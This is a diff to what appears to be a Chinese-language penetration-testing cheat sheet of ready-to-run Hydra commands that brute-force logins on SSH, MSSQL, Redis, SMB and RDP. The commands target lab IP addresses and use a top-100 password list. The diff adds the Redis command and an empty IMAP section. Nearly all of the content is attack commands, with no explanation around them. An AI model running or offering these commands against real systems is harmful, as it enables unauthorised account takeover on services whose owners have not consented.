@@ -72,6 +72,12 @@ hydra -vV -l root -P .\top100password.txt -w 1 -t 5 -f -e ns ssh://192.168.10.13
 ```
 hydra -vV -l sa -P .\top100password.txt -t 5 -w 5 -e ns -f 192.168.10.142 mssql
 ```
+
+* 爆破`reds`服务 ---6379
+```
+ hydra -t 5 -w 3 -e ns -f -P D:\MyHackTool\Direct\Blasting_dictionary\top100password.txt redis://192.168.10.141
+```
+
 * 爆破`SMB`服务 ---445
 ```
 hydra -vV -t 5 -w 3 -e ns -f -l administrator -P D:\MyHackTool\Direct\Blasting_dictionary\top100password.txt 192.168.10.141 smb
@@ -81,8 +87,10 @@ hydra -vV -t 5 -w 3 -e ns -f -l administrator -P D:\MyHackTool\Direct\Blasting_d
 ```
 hydra -vV -t 5 -w 3 -e ns -l administrator -P .\top100password.txt 192.168.10.141 rdp
 ```
-* 爆破`IMAP`服务 ---143
 
+* 爆破`IMAP`服务 ---143
+```
+```
 
 * 爆破`IMAPS`服务 ---993
 
@@ -97,3 +105,6 @@ hydra -vV -t 5 -w 3 -e ns -l administrator -P .\top100password.txt 192.168.10.14
 
 
 * 爆破`SMTPS`服务 ---465
+
+
+
